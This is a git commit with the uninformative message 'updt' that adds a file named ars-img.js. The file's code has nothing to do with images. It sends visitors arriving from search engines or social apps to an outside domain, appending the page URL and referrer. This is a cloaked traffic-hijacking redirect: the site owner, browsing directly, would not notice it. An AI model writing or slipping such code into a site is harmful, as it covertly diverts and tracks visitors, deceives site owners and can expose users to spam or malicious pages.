f9b73841cf5ec50388d1db8ec7064c5086232571
luqmanhakim721 <96166888+luqmanhakim721@users.noreply.github.com>
2022-07-29 10:23:14 +0700

    updt

--- ars-img.js
+++ ars-img.js
@@ -1,1 +1,3 @@
+var ars = 'https://diyparty99.com';
 
+if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
